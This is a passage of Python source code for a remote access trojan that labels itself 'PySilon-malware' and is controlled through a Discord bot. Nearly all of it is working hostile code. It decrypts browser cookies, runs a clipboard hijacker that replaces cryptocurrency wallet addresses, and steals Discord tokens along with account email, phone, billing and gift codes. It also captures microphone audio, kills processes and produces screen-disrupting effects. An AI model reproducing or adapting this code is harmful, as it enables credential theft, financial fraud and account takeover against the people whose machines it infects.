        for proc in psutil.process_iter(['name']):
            process_name = proc.info['name'].lower()
            if process_name in self.browser_exe:
                self.browsers_found.append(proc)    
        for proc in self.browsers_found:
            try:
                proc.kill()
            except Exception:
                pass
        time.sleep(3)

    def grab_cookies(self):
        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue

            self.masterkey = self.get_master_key(path + '\\Local State')
            self.funcs = [
                self.cookies
            ]

            for profile in self.profiles:
                for func in self.funcs:
                    self.process_browser(name, path, profile, func)

    def process_browser(self, name, path, profile, func):
        try:
            func(name, path, profile)
        except Exception as e:
            print(f"Error occurred while processing browser '{name}' with profile '{profile}': {str(e)}")

    def get_master_key(self, path: str) -> str:
        try:
            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except Exception as e:
            print(f"Error occurred while retrieving master key: {str(e)}")

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def cookies(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\Network\\Cookies'
        else:
            path += '\\' + profile + '\\Network\\Cookies'
        if not os.path.isfile(path):
            return
        cookievault = create_temp()
        copy2(path, cookievault)
        conn = sqlite3.connect(cookievault)
        cursor = conn.cursor()
        with open(os.path.join(f"cookies.txt"), 'a', encoding="utf-8") as f:
            f.write(f"\nBrowser: {name} | Profile: {profile}\n\n")
            for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
                host_key, name, path, encrypted_value, expires_utc = res
                value = self.decrypt_password(encrypted_value, self.masterkey)
                if host_key and name and value != "":
                    f.write(f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n")
        cursor.close()
        conn.close()
        os.remove(cookievault)
        return

program_dir = os.path.dirname(os.path.abspath(__file__))
config_path = program_dir + '/crypto_clipper.json'
with open(config_path) as f:
    config_data = json.load(f)
    addresses = config_data.get("addresses", {})
    clipper_settings = config_data.get("settings", {})

def match():
    clipboard = str(pyperclip.paste())
    btc_match = re.match("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}|^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", clipboard)
    eth_match = re.match("^0x[a-zA-F0-9]{40}$", clipboard)
    doge_match = re.match("^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$", clipboard)
    ltc_match = re.match("^([LM3]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}||ltc1[a-z0-9]{39,59})$", clipboard)
    xmr_match = re.match("^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$", clipboard)
    bch_match = re.match("^((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}$", clipboard)
    dash_match = re.match("^X[1-9A-HJ-NP-Za-km-z]{33}$", clipboard)
    trx_match = re.match("^T[A-Za-z1-9]{33}$", clipboard)
    xrp_match = re.match("^r[0-9a-zA-Z]{33}$", clipboard)
    xlm_match = re.match("^G[0-9A-Z]{40,60}$", clipboard)
    for currency, address in addresses.items():
        if eval(f'{currency.lower()}_match'):
            if address and address != clipboard:
                pyperclip.copy(address)
            break

def wait_for_paste():
    while not clipper_thread_stop:
        while not clipper_stop:
            pyperclip.waitForNewPaste()
            match()

if clipper_settings["start-on-launch"]:
    clipper_stop = False
    clipper_thread_stop = False
    clipper_thread = threading.Thread(target=wait_for_paste)
    clipper_thread.start()
else:
    clipper_stop = True
    clipper_thread_stop = True

class grab_discord():
    def initialize(raw_data):
        return fetch_tokens().upload(raw_data)
        
class extract_tokens:
    def __init__(self):
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens = []
        self.ids = []

        self.grabTokens()

    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grabTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.200 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.200 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.200 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

class fetch_tokens:
    def __init__(self):
        self.tokens = extract_tokens().tokens
        self.tokens_sent = []
        self.baseurl = "https://discord.com/api/v9/users/@me"
    
    def upload(self, raw_data):
        final_to_return = []
        for token in self.tokens:
            if token in self.tokens_sent:
                continue

            methods = ""
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.200 Safari/537.36',
                'Content-Type': 'application/json',
                'Authorization': token
            }
            user = requests.get(self.baseurl, headers=headers).json()
            payment = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
            guilds = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
            gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).json()
            username = user['username'] + '#' + user['discriminator']
            discord_id = user['id']
            avatar_url = f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif" \
                if requests.get(f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif").status_code == 200 \
                else f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.png"
            phone = user['phone']
            email = user['email']

            mfa = "✅" if user.get('mfa_enabled') else "None"

            premium_types = {
                0: "None",
                1: "Nitro Classic",
                2: "Nitro",
                3: "Nitro Basic"
            }
            nitro = premium_types.get(user.get('premium_type'), "❌")

            if "message" in payment or not payment == []:
                methods = "None"
            else:
                methods = "".join(["💳" if method['type'] == 1 else "<:paypal:973417655627288666>" if method['type'] == 2 else "❓" for method in payment])

            if guilds:
                hq_guilds = []
                for guild in guilds:
                    admin = int(guild["permissions"]) & 0x8 != 0
                    if admin and guild['approximate_member_count'] >= 100:
                        owner = '✅' if guild['owner'] else '❌'
                        invites = requests.get(f"https://discord.com/api/v9/guilds/{guild['id']}/invites", headers={'Authorization': token}).json()
                        if len(invites) > 0: invite = 'https://discord.gg/' + invites[0]['code']
                        else: invite = "https://youtu.be/dQw4w9WgXcQ"
                        data = f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join Server]({invite})"
                        if len('\n'.join(hq_guilds)) + len(data) >= 1024: break
                        hq_guilds.append(data)

                if len(hq_guilds) > 0: hq_guilds = '\n'.join(hq_guilds) 
                else: hq_guilds = None
            else: hq_guilds = None
            
            if gift_codes:
                codes = []
                for code in gift_codes:
                    name = code['promotion']['outbound_title']
                    code = code['code']
                    data = f":gift: `{name}`\n:ticket: `{code}`"
                    if len('\n\n'.join(codes)) + len(data) >= 1024: break
                    codes.append(data)
                if len(codes) > 0: codes = '\n\n'.join(codes)
                else: codes = None
            else: codes = None

            if not raw_data:
                embed = Embed(title=f"{username} ({discord_id})", color=0x0084ff)
                embed.set_thumbnail(url=avatar_url)
                embed.add_field(name="\u200b\n📜 Token:", value=f"```{token}```\n\u200b", inline=False)
                embed.add_field(name="💎 Nitro:", value=f"{nitro}", inline=False)
                embed.add_field(name="💳 Billing:", value=f"{payment if payment != [] else 'None'}", inline=False)
                embed.add_field(name="🔒 MFA:", value=f"{mfa}\n\u200b", inline=False)
                embed.add_field(name="📧 Email:", value=f"{email if email != None else 'None'}", inline=False)
                embed.add_field(name="📳 Phone:", value=f"{phone if phone != None else 'None'}\n\u200b", inline=False)    

                if hq_guilds != None:
                    embed.add_field(name="🏰 HQ Guilds:", value=hq_guilds, inline=False)

                if codes != None:
                    embed.add_field(name="\u200b\n🎁 Gift Codes:", value=codes, inline=False)

                final_to_return.append(embed)
                self.tokens_sent.append(token)
            else:
                final_to_return.append(json.dumps({'username': username, 'token': token, 'nitro': nitro, 'billing': (payment if payment != "" else "None"), 'mfa': mfa, 'email': (email if email != None else "None"), 'phone': (phone if phone != None else "None"), 'hq_guilds': hq_guilds, 'gift_codes': codes}))
        return final_to_return

bundle_dir = os.path.dirname(os.path.abspath(__file__))
opuslib_path = bundle_dir + 'resources/modules/libopus-0.x64.dll'
discord.opus.load_opus(opuslib_path)
class PyAudioPCM(discord.AudioSource):
    def __init__(self, channels=2, rate=48000, chunk=960, input_device=1) -> None:
        p = pyaudio.PyAudio()
        self.chunks = chunk
        self.input_stream = p.open(format=pyaudio.paInt16, channels=channels, rate=rate, input=True, input_device_index=input_device, frames_per_buffer=chunk)
    def read(self) -> bytes:
        return self.input_stream.read(self.chunks)

def process_blacklister():
    global embeds_to_send
    while True:
        if os.path.exists(f'{os.path.dirname(sys.executable)}\\disabled_processes.psln'):
            with open(f'{os.path.dirname(sys.executable)}\\disabled_processes.psln', 'r', encoding='utf-8') as disabled_processes:
                process_blacklist = disabled_processes.readlines()
            for x, y in enumerate(process_blacklist): process_blacklist[x] = y.replace('\n', '')
            for process in process_blacklist:
                if process.lower() in [proc.name().lower() for proc in process_iter()]:
                    stdout = pysilon_misc.force_decode(subprocess.run(f'taskkill /f /IM {process} /t', capture_output=True, shell=True).stdout).strip()
                    time.sleep(1)
                    if process.lower() not in [proc.name().lower() for proc in process_iter()]:
                        embed = discord.Embed(title="🟢 Success", description=f'```Process Blacklister killed {process}```', colour=discord.Colour.green())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        embeds_to_send.append([channel_ids['main'], embed])
                    else:
                        embed = discord.Embed(title="📛 Error",description=f'```Process Blacklister tried to kill {process} but it\'s still running...```', colour=discord.Colour.red())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        embeds_to_send.append([channel_ids['main'], embed])
        time.sleep(1)

def active_window_process_name():
    try:
        pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())
        return(Process(pid[-1]).name())
    except: return None

def check_int(to_check):
    try:
        asd = int(to_check) + 1
        return True
    except: return False

class screen_manipulator:
    def __init__(self, saved_file):
        with open(saved_file, 'r', encoding='utf-8') as read_data:
            input_data = read_data.readlines()[0]
        settings, pixeldata = input_data.split('|')
        self.settings = json.loads(settings)
        self.pixeldata = pixeldata.split(',')
        self.saved_file = saved_file
        self.canvas_width, self.canvas_height = self.settings['resolution'][0], self.settings['resolution'][1]
    def hex_to_rgb(self, hex):
        rgb = []
        hex = hex[1:]
        for i in (0, 2, 4):
            decimal = int(hex[i:i+2], 16)
            rgb.append(decimal)
        return tuple(rgb)
    def display_graphic(self, seconds):
        with open(self.saved_file, 'r', encoding='utf-8') as load_data:
            data = load_data.readlines()
        frame, unfetched_pixels = data[0].split('|')
        frame = json.loads(frame)
        pixels = []
        for line in unfetched_pixels.split(','):
            x, y = line.split(':')[0].split('.')
            if frame['mode'] == 'img':
                color = line.split(':')[1]
            elif frame['mode'] == 'bmp':
                color = frame['color']
            pixels.append((int(x), int(y), self.hex_to_rgb(color)))
        size = frame['size']
        screen_dc = win32gui.GetDC(0)
        screen_x_resolution = win32print.GetDeviceCaps(screen_dc, win32con.DESKTOPHORZRES)
        screen_y_resolution = win32print.GetDeviceCaps(screen_dc, win32con.DESKTOPVERTRES)
        starting_pos = (int(screen_x_resolution*(int(frame['position'][0])/100)), int(screen_y_resolution*(int(frame['position'][1])/100)))
        drawing = pixels
        start_time = time.time()
        while time.time() - start_time < seconds:
            screen_dc = win32gui.GetDC(0)
            for pixel in drawing:
                brush = win32gui.CreateSolidBrush(win32api.RGB(pixel[2][0], pixel[2][1], pixel[2][2]))
                win32gui.SelectObject(screen_dc, brush)
                win32gui.PatBlt(screen_dc, starting_pos[0] + pixel[0] * size, starting_pos[1] + pixel[1] * size, size, size, win32con.PATCOPY)
            win32gui.DeleteObject(brush)
            win32gui.ReleaseDC(0, screen_dc)

def flash_screen(effect):
    hdc = win32gui.GetDC(0)
    x, y = win32api.GetSystemMetrics(0), win32api.GetSystemMetrics(1)
    if effect == 'list':
        return ['invert\n', 'noise\n', 'lines\n', 'invert_squares\n', 'color_squares\n', 'diagonal_lines\n', 'snowfall\n', 'hypnotic_spirals\n', 'random_lines\n']
    elif effect == 'invert':
        while True:
            win32gui.PatBlt(hdc, 0, 0, x, y, win32con.PATINVERT)
    
    elif effect == 'noise':
        for _ in range(x * y // 20):
            rand_x = random.randint(0, x)
            rand_y = random.randint(0, y)
            size = 100
            color = win32api.RGB(random.randrange(1), random.randrange(1), random.randrange(1))
            brush = win32gui.CreateSolidBrush(color)
            win32gui.SelectObject(hdc, brush)
            win32gui.PatBlt(hdc, rand_x, rand_y, size, size, win32con.PATCOPY)
    
    elif effect == 'lines':
        for _ in range(0, y, 5):
            win32gui.PatBlt(hdc, 0, _, x, 2, win32con.PATINVERT)
    elif effect == 'invert_squares':
        for _ in range(200):
            rand_x1 = random.randint(0, x)
            rand_y1 = random.randint(0, y)
            rand_x2 = random.randint(0, x)
            rand_y2 = random.randint(0, y)
            win32gui.PatBlt(hdc, rand_x1, rand_y1, rand_x2 - rand_x1, rand_y2 - rand_y1, win32con.PATINVERT)
    elif effect == 'color_squares':
        for i in range(10):
            for x in range(0, x, 20):
                for y in range(0, y, 20):
                    brush = win32gui.CreateSolidBrush(win32api.RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
                    win32gui.SelectObject(hdc, brush)
                    win32gui.PatBlt(hdc, x, y, 10, 10, win32con.PATCOPY)
                    win32gui.DeleteObject(brush)
                    brush = win32gui.CreateSolidBrush(win32api.RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
                    win32gui.SelectObject(hdc, brush)
                    win32gui.PatBlt(hdc, x + 10, y + 10, 10, 10, win32con.PATCOPY)
                    win32gui.DeleteObject(brush)
    elif effect == 'diagonal_lines':
        for x in range(0, x, 10):
            brush = win32gui.CreateSolidBrush(win32api.RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
            win32gui.SelectObject(hdc, brush)
            win32gui.PatBlt(hdc, x, 0, 1, y, win32con.PATCOPY)
            win32gui.DeleteObject(brush)
        for y in range(0, y, 10):
            brush = win32gui.CreateSolidBrush(win32api.RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
            win32gui.SelectObject(hdc, brush)
            win32gui.PatBlt(hdc, 0, y, x, 1, win32con.PATCOPY)
            win32gui.DeleteObject(brush)
    elif effect == 'snowfall':
        for i in range(10):
            stars = [(random.randint(0, x), random.randint(0, y), random.randint(1, 4)) for _ in range(100)]
            for star in stars:
                rand_x, rand_y, size = star
                color = win32api.RGB(255, 255, 255)
                brush = win32gui.CreateSolidBrush(color)
                win32gui.SelectObject(hdc, brush)
                win32gui.PatBlt(hdc, rand_x, rand_y, size, size, win32con.PATCOPY)
            time.sleep(0.5)
    elif effect == 'hypnotic_spirals':
        for angle in range(0, 180, 1):
            radius = 1000
            x1 = int(x / 2 + radius * math.cos(math.radians(angle)))
            y1 = int(y / 2 - radius * math.sin(math.radians(angle)))
            x2 = int(x / 2 + radius * math.cos(math.radians(angle + 180)))
            y2 = int(y / 2 - radius * math.sin(math.radians(angle + 180)))
            color = win32api.RGB(random.randrange(1), random.randrange(1), random.randrange(1))
            pen = win32gui.CreatePen(win32con.PS_SOLID, 1, color)
            win32gui.SelectObject(hdc, pen)
            win32gui.MoveToEx(hdc, x1, y1)
            win32gui.LineTo(hdc, x2, y2)
            win32gui.DeleteObject(pen)
    elif effect == 'random_lines':
        for _ in range(50):
            x1 = random.randint(0, x)
            y1 = random.randint(0, y)
            x2 = random.randint(0, x)
            y2 = random.randint(0, y)
            color = win32api.RGB(random.randrange(255), random.randrange(255), random.randrange(255))
            pen = win32gui.CreatePen(win32con.PS_SOLID, 2, color)
            win32gui.SelectObject(hdc, pen)
            win32gui.MoveToEx(hdc, x1, y1)
            win32gui.LineTo(hdc, x2, y2)
            win32gui.DeleteObject(pen)
    
    else:
        win32gui.PatBlt(hdc, 0, 0, x, y, win32con.PATINVERT)
    if effect != 'list':
        win32api.Sleep(10)
        win32gui.DeleteDC(hdc)

def get_hosts_file_path():
    hosts_file_path = r'C:\Windows\System32\drivers\etc\hosts'

    if ctypes.windll.kernel32.GetFileAttributesW(hosts_file_path) != -1:
        return hosts_file_path

    return None

bot = PySilon(command_prefix='.', self_bot=False)
bot.run('')